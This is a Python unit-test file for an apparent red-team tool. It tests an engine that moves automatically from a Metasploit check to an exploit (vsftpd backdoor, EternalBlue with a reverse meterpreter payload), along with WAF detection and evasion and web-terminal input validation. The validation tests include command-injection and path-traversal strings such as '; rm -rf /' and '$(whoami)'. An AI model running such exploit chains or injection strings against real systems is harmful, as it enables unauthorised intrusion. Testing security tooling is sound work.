import os
import sys
import unittest

os.environ.setdefault("ATTACK_SURFACE_NO_AUTOTERM", "1")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestAutoExploit(unittest.TestCase):
    """CHECK → EXPLOIT auto-loop engine."""

    def test_confirms_vulnerable_phrases(self):
        from modules.redteam.auto_exploit import output_confirms_vuln
        self.assertTrue(output_confirms_vuln(
            "[*] 10.0.0.5:445 - Host is likely VULNERABLE to MS17-010!"))
        self.assertTrue(output_confirms_vuln(
            "The target appears to be vulnerable to CVE-2014-6271"))
        self.assertFalse(output_confirms_vuln(
            "[-] 10.0.0.5:445 - Host is NOT vulnerable to MS17-010"))
        self.assertFalse(output_confirms_vuln("[*] Auxiliary module completed"))

    def test_evidence_lines_extracted(self):
        from modules.redteam.auto_exploit import evidence_lines
        out = "[*] scanning\n[+] 1.2.3.4 is likely VULNERABLE to MS17-010\n[*] done"
        ev = evidence_lines(out)
        self.assertEqual(len(ev), 1)
        self.assertIn("VULNERABLE", ev[0])

    def test_find_exploit_chain_vsftpd(self):
        from modules.redteam.auto_exploit import find_exploit_chain
        ch = find_exploit_chain("t.example", "vsftpd", "2.3.4")
        self.assertIsNotNone(ch)
        self.assertEqual(ch["module"], "exploit/unix/ftp/vsftpd_234_backdoor")
        self.assertIn("set PAYLOAD", ch["cmd"])
        self.assertIn("set LHOST", ch["cmd"])
        self.assertIn("check", ch["cmd"])

    def test_find_exploit_chain_none_for_check_only(self):
        from modules.redteam.auto_exploit import find_exploit_chain
        # modern vsftpd has no pinned exploit → None (check-only service)
        self.assertIsNone(find_exploit_chain("t.example", "vsftpd", "3.0.3"))
        self.assertIsNone(find_exploit_chain("t.example", "", ""))

    def test_maybe_chain_exploit_end_to_end(self):
        from modules.redteam.auto_exploit import maybe_chain_exploit
        calls = []

        def fake_open_terminal(tool, cmd, target, finding):
            calls.append({"tool": tool, "cmd": cmd, "target": target})
            return {"ok": True, "session": "as_metasploit_test1",
                    "attach_cmd": "docker exec -it kali-as tmux attach -t as_metasploit_test1"}

        job = {"tool": "metasploit", "target": "victim.example",
               "meta": {"host": "victim.example", "product": "vsftpd",
                        "version": "2.3.4"},
               "output": "[*] vsftpd backdoor check\n[+] victim.example is likely VULNERABLE to vsftpd 2.3.4 backdoor"}
        res = maybe_chain_exploit(job, fake_open_terminal)
        self.assertIsNotNone(res)
        self.assertEqual(len(calls), 1)
        self.assertIn("vsftpd_234_backdoor", calls[0]["cmd"])
        self.assertIn("auto_exploit", job)

    def test_maybe_chain_ignores_non_metasploit_jobs(self):
        from modules.redteam.auto_exploit import maybe_chain_exploit
        res = maybe_chain_exploit(
            {"tool": "nmap", "output": "is likely VULNERABLE"},
            lambda *a: {"ok": True})
        self.assertIsNone(res)

    def test_maybe_chain_no_fire_on_negative(self):
        from modules.redteam.auto_exploit import maybe_chain_exploit
        calls = []
        res = maybe_chain_exploit(
            {"tool": "metasploit", "target": "t",
             "meta": {"product": "vsftpd", "version": "2.3.4"},
             "output": "Host is NOT vulnerable"},
            lambda *a: calls.append(a) or {"ok": True})
        self.assertIsNone(res)
        self.assertEqual(calls, [])


class TestWAFDetect(unittest.TestCase):
    def test_cloudflare_header_detected(self):
        from modules.waf_detect import detect_waf
        r = detect_waf({"Server": "cloudflare", "Cf-Ray": "abc-DEF"}, "", 403)
        self.assertTrue(r["detected"])
        self.assertEqual(r["waf"], "cloudflare")

    def test_sucuri_detected(self):
        from modules.waf_detect import detect_waf
        r = detect_waf({"X-Sucuri-Id": "12000"}, "", 200)
        self.assertTrue(r["detected"])
        self.assertEqual(r["waf"], "sucuri")

    def test_body_hint_on_403(self):
        from modules.waf_detect import detect_waf
        r = detect_waf({}, "<html>Access denied by security check</html>", 403)
        self.assertTrue(r["detected"])

    def test_clean_nginx_not_flagged(self):
        from modules.waf_detect import detect_waf
        r = detect_waf({"Server": "nginx/1.24.0", "Content-Type": "text/html"},
                       "<html><body>hello</body></html>", 200)
        self.assertFalse(r["detected"])

    def test_evasion_scan_never_raises(self):
        from modules.waf_detect import evasion_scan
        r = evasion_scan("127.0.0.1", timeout=10)
        self.assertIn("attempted", r)
        self.assertIn("note", r)

    def test_assess_hosts_caps_evasion(self):
        from modules.waf_detect import assess_hosts
        hdrs = {f"h{i}.example": {"all_headers": {"Server": "cloudflare"},
                                  "status_code": 403} for i in range(8)}
        hits = assess_hosts(hdrs, run_evasion=False)
        self.assertEqual(len(hits), 8)


class TestWebTerminal(unittest.TestCase):
    def test_session_name_validation(self):
        from modules import web_terminal
        self.assertFalse(web_terminal._valid("as_web_; rm -rf /"))
        self.assertFalse(web_terminal._valid("../../etc/passwd"))
        self.assertTrue(web_terminal._valid("as_web_deadbeef"))

    def test_send_keys_rejects_bad_session(self):
        from modules import web_terminal
        r = web_terminal.send_keys("bad;id", "ls")
        self.assertFalse(r["ok"])

    def test_capture_rejects_bad_session(self):
        from modules import web_terminal
        r = web_terminal.capture("$(whoami)")
        self.assertFalse(r["ok"])
        self.assertEqual(r["screen"], "")


class TestMSFAdvisor(unittest.TestCase):
    def test_resource_script_content(self):
        from modules.redteam.msf_advisor import resource_script
        rc = resource_script("exploit/windows/smb/ms17_010_eternalblue",
                             "10.0.0.5", "windows/x64/meterpreter/reverse_tcp",
                             "192.168.1.10")
        self.assertIn("use exploit/windows/smb/ms17_010_eternalblue", rc)
        self.assertIn("set RHOSTS 10.0.0.5", rc)
        self.assertIn("set PAYLOAD windows/x64/meterpreter/reverse_tcp", rc)
        self.assertIn("set LHOST 192.168.1.10", rc)
        self.assertIn("exploit -j", rc)

    def test_prepare_rejects_bad_input(self):
        from modules.redteam.msf_advisor import prepare_terminal
        self.assertFalse(prepare_terminal("", "10.0.0.5")["ok"])
        self.assertFalse(prepare_terminal("exploit/x", "10.0.0.5; rm -rf /")["ok"])
        self.assertFalse(prepare_terminal("exploit/x", "")["ok"])

    def test_rank_labels(self):
        self.assertEqual(__import__("modules.redteam.msf_advisor", fromlist=["x"])._RANK_LABEL[600], "excellent")


class TestDashboardNewEndpoints(unittest.TestCase):
    def test_html_has_term_and_advisor_nodes(self):
        from modules.dashboard import _HTML
        self.assertIn("tab-term", _HTML)
        self.assertIn("term-screen", _HTML)
        self.assertIn("msf-q", _HTML)
        self.assertIn("msfSearch", _HTML)
        self.assertIn("msfWaf", _HTML)
        self.assertIn("termPrefill", _HTML)


if __name__ == "__main__":
    unittest.main()
